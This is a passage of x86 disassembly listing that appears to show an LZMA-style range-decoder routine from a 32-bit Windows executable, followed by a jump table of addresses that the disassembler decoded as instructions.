  40729c:	c1 e3 04             	shl    $0x4,%ebx
  40729f:	03 c3                	add    %ebx,%eax
  4072a1:	c7 45 c0 04 00 00 00 	movl   $0x4,-0x40(%ebp)
  4072a8:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4072ab:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4072ae:	05 44 06 00 00       	add    $0x644,%eax
  4072b3:	33 db                	xor    %ebx,%ebx
  4072b5:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4072b8:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  4072bf:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4072c2:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  4072c5:	eb 28                	jmp    0x4072ef
  4072c7:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4072cb:	0f 84 21 03 00 00    	je     0x4075f2
  4072d1:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4072d4:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4072d7:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  4072db:	0f b6 09             	movzbl (%ecx),%ecx
  4072de:	ff 4d 94             	decl   -0x6c(%ebp)
  4072e1:	c1 e0 08             	shl    $0x8,%eax
  4072e4:	0b c1                	or     %ecx,%eax
  4072e6:	ff 45 90             	incl   -0x70(%ebp)
  4072e9:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4072ec:	ff 45 b8             	incl   -0x48(%ebp)
  4072ef:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4072f2:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  4072f5:	7d 72                	jge    0x407369
  4072f7:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4072fa:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4072fd:	c1 ea 0b             	shr    $0xb,%edx
  407300:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  407303:	8b 45 a8             	mov    -0x58(%ebp),%eax
  407306:	8d 34 07             	lea    (%edi,%eax,1),%esi
  407309:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40730c:	66 8b 06             	mov    (%esi),%ax
  40730f:	0f b7 c8             	movzwl %ax,%ecx
  407312:	0f af d1             	imul   %ecx,%edx
  407315:	39 55 f4             	cmp    %edx,-0xc(%ebp)
  407318:	73 17                	jae    0x407331
  40731a:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40731d:	ba 00 08 00 00       	mov    $0x800,%edx
  407322:	2b d1                	sub    %ecx,%edx
  407324:	c1 fa 05             	sar    $0x5,%edx
  407327:	03 d0                	add    %eax,%edx
  407329:	d1 65 b0             	shll   $1,-0x50(%ebp)
  40732c:	66 89 16             	mov    %dx,(%esi)
  40732f:	eb 2a                	jmp    0x40735b
  407331:	33 c9                	xor    %ecx,%ecx
  407333:	29 55 f0             	sub    %edx,-0x10(%ebp)
  407336:	41                   	inc    %ecx
  407337:	29 55 f4             	sub    %edx,-0xc(%ebp)
  40733a:	8b d9                	mov    %ecx,%ebx
  40733c:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  40733f:	d3 e3                	shl    %cl,%ebx
  407341:	8b cb                	mov    %ebx,%ecx
  407343:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  407346:	0b d9                	or     %ecx,%ebx
  407348:	66 8b c8             	mov    %ax,%cx
  40734b:	66 c1 e9 05          	shr    $0x5,%cx
  40734f:	2b c1                	sub    %ecx,%eax
  407351:	47                   	inc    %edi
  407352:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  407355:	66 89 06             	mov    %ax,(%esi)
  407358:	89 7d b0             	mov    %edi,-0x50(%ebp)
  40735b:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  407362:	73 88                	jae    0x4072ec
  407364:	e9 5e ff ff ff       	jmp    0x4072c7
  407369:	01 5d d4             	add    %ebx,-0x2c(%ebp)
  40736c:	ff 45 d4             	incl   -0x2c(%ebp)
  40736f:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407372:	85 c0                	test   %eax,%eax
  407374:	0f 84 84 02 00 00    	je     0x4075fe
  40737a:	3b 45 a0             	cmp    -0x60(%ebp),%eax
  40737d:	0f 87 b8 02 00 00    	ja     0x40763b
  407383:	83 45 d0 02          	addl   $0x2,-0x30(%ebp)
  407387:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40738a:	01 45 a0             	add    %eax,-0x60(%ebp)
  40738d:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  407391:	0f 84 6d 02 00 00    	je     0x407604
  407397:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40739a:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  40739d:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  4073a0:	72 03                	jb     0x4073a5
  4073a2:	03 45 8c             	add    -0x74(%ebp),%eax
  4073a5:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4073a8:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  4073ab:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4073ae:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  4073b1:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  4073b4:	40                   	inc    %eax
  4073b5:	33 d2                	xor    %edx,%edx
  4073b7:	f7 75 8c             	divl   -0x74(%ebp)
  4073ba:	8b 45 98             	mov    -0x68(%ebp),%eax
  4073bd:	ff 45 98             	incl   -0x68(%ebp)
  4073c0:	ff 4d 9c             	decl   -0x64(%ebp)
  4073c3:	ff 4d d0             	decl   -0x30(%ebp)
  4073c6:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  4073ca:	88 08                	mov    %cl,(%eax)
  4073cc:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4073cf:	7f bc                	jg     0x40738d
  4073d1:	e9 78 fd ff ff       	jmp    0x40714e
  4073d6:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  4073da:	75 20                	jne    0x4073fc
  4073dc:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  4073df:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  4073e3:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4073e6:	c1 e0 04             	shl    $0x4,%eax
  4073e9:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
  4073ed:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4073f0:	c7 45 c0 03 00 00 00 	movl   $0x3,-0x40(%ebp)
  4073f7:	e9 ce 00 00 00       	jmp    0x4074ca
  4073fc:	8b 45 a8             	mov    -0x58(%ebp),%eax
  4073ff:	c7 85 7c ff ff ff 13 	movl   $0x13,-0x84(%ebp)
  407406:	00 00 00 
  407409:	8d 70 02             	lea    0x2(%eax),%esi
  40740c:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40740f:	66 8b 06             	mov    (%esi),%ax
  407412:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407415:	0f b7 d0             	movzwl %ax,%edx
  407418:	c1 e9 0b             	shr    $0xb,%ecx
  40741b:	0f af ca             	imul   %edx,%ecx
  40741e:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  407421:	73 18                	jae    0x40743b
  407423:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  407426:	b9 00 08 00 00       	mov    $0x800,%ecx
  40742b:	2b ca                	sub    %edx,%ecx
  40742d:	c1 f9 05             	sar    $0x5,%ecx
  407430:	03 c8                	add    %eax,%ecx
  407432:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  407436:	66 89 0e             	mov    %cx,(%esi)
  407439:	eb 19                	jmp    0x407454
  40743b:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  40743e:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  407441:	66 8b c8             	mov    %ax,%cx
  407444:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  40744b:	66 c1 e9 05          	shr    $0x5,%cx
  40744f:	2b c1                	sub    %ecx,%eax
  407451:	66 89 06             	mov    %ax,(%esi)
  407454:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  40745b:	73 25                	jae    0x407482
  40745d:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  407461:	0f 84 a9 01 00 00    	je     0x407610
  407467:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  40746a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40746d:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  407471:	0f b6 09             	movzbl (%ecx),%ecx
  407474:	ff 4d 94             	decl   -0x6c(%ebp)
  407477:	c1 e0 08             	shl    $0x8,%eax
  40747a:	0b c1                	or     %ecx,%eax
  40747c:	ff 45 90             	incl   -0x70(%ebp)
  40747f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407482:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  407488:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  40748e:	e9 91 f7 ff ff       	jmp    0x406c24
  407493:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  407497:	75 1c                	jne    0x4074b5
  407499:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40749c:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  40749f:	c1 e0 04             	shl    $0x4,%eax
  4074a2:	c7 45 d0 08 00 00 00 	movl   $0x8,-0x30(%ebp)
  4074a9:	8d 84 01 04 01 00 00 	lea    0x104(%ecx,%eax,1),%eax
  4074b0:	e9 38 ff ff ff       	jmp    0x4073ed
  4074b5:	81 45 a8 04 02 00 00 	addl   $0x204,-0x58(%ebp)
  4074bc:	c7 45 d0 10 00 00 00 	movl   $0x10,-0x30(%ebp)
  4074c3:	c7 45 c0 08 00 00 00 	movl   $0x8,-0x40(%ebp)
  4074ca:	c7 45 84 14 00 00 00 	movl   $0x14,-0x7c(%ebp)
  4074d1:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4074d4:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  4074db:	89 45 b8             	mov    %eax,-0x48(%ebp)
  4074de:	eb 28                	jmp    0x407508
  4074e0:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4074e4:	0f 84 32 01 00 00    	je     0x40761c
  4074ea:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4074ed:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4074f0:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  4074f4:	0f b6 09             	movzbl (%ecx),%ecx
  4074f7:	ff 4d 94             	decl   -0x6c(%ebp)
  4074fa:	c1 e0 08             	shl    $0x8,%eax
  4074fd:	0b c1                	or     %ecx,%eax
  4074ff:	ff 45 90             	incl   -0x70(%ebp)
  407502:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407505:	ff 4d b8             	decl   -0x48(%ebp)
  407508:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  40750c:	7e 5e                	jle    0x40756c
  40750e:	8b 45 b0             	mov    -0x50(%ebp),%eax
  407511:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407514:	c1 e9 0b             	shr    $0xb,%ecx
  407517:	8d 14 00             	lea    (%eax,%eax,1),%edx
  40751a:	8b 45 a8             	mov    -0x58(%ebp),%eax
  40751d:	8d 34 02             	lea    (%edx,%eax,1),%esi
  407520:	89 75 ac             	mov    %esi,-0x54(%ebp)
  407523:	66 8b 06             	mov    (%esi),%ax
  407526:	0f b7 f8             	movzwl %ax,%edi
  407529:	0f af cf             	imul   %edi,%ecx
  40752c:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  40752f:	73 17                	jae    0x407548
  407531:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  407534:	b9 00 08 00 00       	mov    $0x800,%ecx
  407539:	2b cf                	sub    %edi,%ecx
  40753b:	c1 f9 05             	sar    $0x5,%ecx
  40753e:	03 c8                	add    %eax,%ecx
  407540:	d1 65 b0             	shll   $1,-0x50(%ebp)
  407543:	66 89 0e             	mov    %cx,(%esi)
  407546:	eb 16                	jmp    0x40755e
  407548:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  40754b:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  40754e:	66 8b c8             	mov    %ax,%cx
  407551:	66 c1 e9 05          	shr    $0x5,%cx
  407555:	2b c1                	sub    %ecx,%eax
  407557:	42                   	inc    %edx
  407558:	66 89 06             	mov    %ax,(%esi)
  40755b:	89 55 b0             	mov    %edx,-0x50(%ebp)
  40755e:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  407565:	73 9e                	jae    0x407505
  407567:	e9 74 ff ff ff       	jmp    0x4074e0
  40756c:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  40756f:	8b 5d b0             	mov    -0x50(%ebp),%ebx
  407572:	33 c0                	xor    %eax,%eax
  407574:	40                   	inc    %eax
  407575:	d3 e0                	shl    %cl,%eax
  407577:	2b d8                	sub    %eax,%ebx
  407579:	8b 45 84             	mov    -0x7c(%ebp),%eax
  40757c:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40757f:	e9 04 ff ff ff       	jmp    0x407488
  407584:	01 5d d0             	add    %ebx,-0x30(%ebp)
  407587:	8b 45 80             	mov    -0x80(%ebp),%eax
  40758a:	e9 f9 fe ff ff       	jmp    0x407488
  40758f:	c7 85 78 ff ff ff 01 	movl   $0x1,-0x88(%ebp)
  407596:	00 00 00 
  407599:	e9 88 00 00 00       	jmp    0x407626
  40759e:	c7 85 78 ff ff ff 03 	movl   $0x3,-0x88(%ebp)
  4075a5:	00 00 00 
  4075a8:	eb 7c                	jmp    0x407626
  4075aa:	c7 85 78 ff ff ff 0d 	movl   $0xd,-0x88(%ebp)
  4075b1:	00 00 00 
  4075b4:	eb 70                	jmp    0x407626
  4075b6:	c7 85 78 ff ff ff 0e 	movl   $0xe,-0x88(%ebp)
  4075bd:	00 00 00 
  4075c0:	eb 64                	jmp    0x407626
  4075c2:	c7 85 78 ff ff ff 0f 	movl   $0xf,-0x88(%ebp)
  4075c9:	00 00 00 
  4075cc:	eb 58                	jmp    0x407626
  4075ce:	c7 85 78 ff ff ff 1a 	movl   $0x1a,-0x88(%ebp)
  4075d5:	00 00 00 
  4075d8:	eb 4c                	jmp    0x407626
  4075da:	c7 85 78 ff ff ff 1b 	movl   $0x1b,-0x88(%ebp)
  4075e1:	00 00 00 
  4075e4:	eb 40                	jmp    0x407626
  4075e6:	c7 85 78 ff ff ff 0c 	movl   $0xc,-0x88(%ebp)
  4075ed:	00 00 00 
  4075f0:	eb 34                	jmp    0x407626
  4075f2:	c7 85 78 ff ff ff 10 	movl   $0x10,-0x88(%ebp)
  4075f9:	00 00 00 
  4075fc:	eb 28                	jmp    0x407626
  4075fe:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  407602:	eb 22                	jmp    0x407626
  407604:	c7 85 78 ff ff ff 1c 	movl   $0x1c,-0x88(%ebp)
  40760b:	00 00 00 
  40760e:	eb 16                	jmp    0x407626
  407610:	c7 85 78 ff ff ff 05 	movl   $0x5,-0x88(%ebp)
  407617:	00 00 00 
  40761a:	eb 0a                	jmp    0x407626
  40761c:	c7 85 78 ff ff ff 18 	movl   $0x18,-0x88(%ebp)
  407623:	00 00 00 
  407626:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  40762c:	6a 22                	push   $0x22
  40762e:	59                   	pop    %ecx
  40762f:	8d b5 78 ff ff ff    	lea    -0x88(%ebp),%esi
  407635:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407637:	33 c0                	xor    %eax,%eax
  407639:	eb 03                	jmp    0x40763e
  40763b:	83 c8 ff             	or     $0xffffffff,%eax
  40763e:	5f                   	pop    %edi
  40763f:	5e                   	pop    %esi
  407640:	5b                   	pop    %ebx
  407641:	c9                   	leave
  407642:	c3                   	ret
  407643:	3a 6c 40 00          	cmp    0x0(%eax,%eax,2),%ch
  407647:	df 6c 40 00          	fildll 0x0(%eax,%eax,2)
  40764b:	7a 6d                	jp     0x4076ba
  40764d:	40                   	inc    %eax
  40764e:	00 4f 6d             	add    %cl,0x6d(%edi)
  407651:	40                   	inc    %eax
  407652:	00 0f                	add    %cl,(%edi)
  407654:	74 40                	je     0x407696
  407656:	00 5d 74             	add    %bl,0x74(%ebp)
  407659:	40                   	inc    %eax
  40765a:	00 a0 6d 40 00 3f    	add    %ah,0x3f00406d(%eax)
  407660:	70 40                	jo     0x4076a2
  407662:	00 a9 70 40 00 ec    	add    %ch,-0x13ffbf90(%ecx)
  407668:	70 40                	jo     0x4076aa
  40766a:	00 5d 71             	add    %bl,0x71(%ebp)
  40766d:	40                   	inc    %eax
  40766e:	00 84 71 40 00 44 72 	add    %al,0x72440040(%ecx,%esi,2)
  407675:	40                   	inc    %eax
  407676:	00 39                	add    %bh,(%ecx)
  407678:	6e                   	outsb  %ds:(%esi),(%dx)
  407679:	40                   	inc    %eax
  40767a:	00 f2                	add    %dh,%dl
  40767c:	6e                   	outsb  %ds:(%esi),(%dx)
  40767d:	40                   	inc    %eax
  40767e:	00 b6 6f 40 00 c7    	add    %dh,-0x38ffbf91(%esi)
  407684:	72 40                	jb     0x4076c6
  407686:	00 97 70 40 00 d6    	add    %dl,-0x29ffbf90(%edi)
  40768c:	73 40                	jae    0x4076ce
  40768e:	00 93 74 40 00 84    	add    %dl,-0x7bffbf8c(%ebx)
  407694:	75 40                	jne    0x4076d6
  407696:	00 be 71 40 00 d5    	add    %bh,-0x2affbf8f(%esi)
  40769c:	71 40                	jno    0x4076de
  40769e:	00 d1                	add    %dl,%cl
  4076a0:	74 40                	je     0x4076e2
  4076a2:	00 e0                	add    %ah,%al
  4076a4:	74 40                	je     0x4076e6
  4076a6:	00 03                	add    %al,(%ebx)
  4076a8:	72 40                	jb     0x4076ea
  4076aa:	00 85 6f 40 00 10    	add    %al,0x1000406f(%ebp)
  4076b0:	71 40                	jno    0x4076f2
  4076b2:	00                   	.byte 0
  4076b3:	8d 73 40             	lea    0x40(%ebx),%esi
	...
